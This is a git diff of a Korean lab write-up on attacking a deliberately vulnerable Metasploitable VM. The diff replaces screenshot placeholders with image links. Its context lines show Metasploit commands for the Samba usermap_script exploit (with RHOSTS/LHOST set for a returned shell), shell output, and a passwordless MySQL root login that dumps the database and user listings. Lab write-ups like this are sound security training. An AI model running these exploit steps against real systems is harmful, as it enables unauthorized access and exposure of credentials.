@@ -149,7 +149,8 @@ Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성
    msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.118.129
    msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.118.128
    ```
-   > [스크린샷 삽입 자리 ①: search usermap_script 결과 + RHOSTS/LHOST 설정 화면]
+   > <img width="1113" height="728" alt="image" src="https://github.com/user-attachments/assets/7c8e97a6-30a6-4bf4-8e20-8b885b700f6e" />
+
 
 2. **공격 실행 및 권한 확인**
    ```
@@ -165,7 +166,8 @@ Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성
    hostname
    metasploitable
    ```
-   > [스크린샷 삽입 자리 ②: exploit 성공 로그 + whoami/id/hostname 결과 화면]
+   > <img width="1129" height="294" alt="image" src="https://github.com/user-attachments/assets/3fca605a-84c0-40ef-a66d-de9265628744" />
+
 
    > 참고: 본 모듈은 Meterpreter가 아닌 **일반 command shell**을 반환한다.
    > 따라서 Meterpreter 전용 명령어(`getuid`, `sysinfo`)는 사용할 수 없으며,
@@ -208,7 +210,8 @@ Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성
    Server version: 5.0.51a-3ubuntu5 (Ubuntu)
    MySQL [(none)]>
    ```
-   > [스크린샷 삽입 자리 ③: --skip-ssl 옵션으로 비밀번호 없이 접속 성공한 화면]
+   > <img width="716" height="377" alt="image" src="https://github.com/user-attachments/assets/9ea6e960-9c8e-4acc-9194-e02e78c2c1bc" />
+
 
    > 참고: Kali의 최신 mysql 클라이언트와 대상 서버의 구버전 MySQL 간
    > TLS 버전 불일치로 기본 접속 시 `ERROR 2026: TLS/SSL error`가 발생하여,
@@ -229,7 +232,8 @@ Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성
    | tikiwiki195         |
    +--------------------+
    ```
-   > [스크린샷 삽입 자리 ④: show databases 결과 화면]
+   > <img width="716" height="377" alt="image" src="https://github.com/user-attachments/assets/5d8d0592-979a-4289-87d1-28dfd9244f82" />
+
 
 3. **계정 정보 테이블 확인** (민감 정보 노출 증거)
    ```sql
@@ -242,7 +246,7 @@ Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성
    | root            |          |
    +-----------------+----------+
    ```
-   > [스크린샷 삽입 자리 ⑤: user 테이블 조회 결과 화면]
+   > <img width="748" height="234" alt="image" src="https://github.com/user-attachments/assets/401d80ca-7f5b-471c-a2b7-d29a02c9400d" />
 
    `root` 계정의 Password 컬럼이 비어 있어, 해시값조차 설정되지 않은
    상태임을 확인하였다.
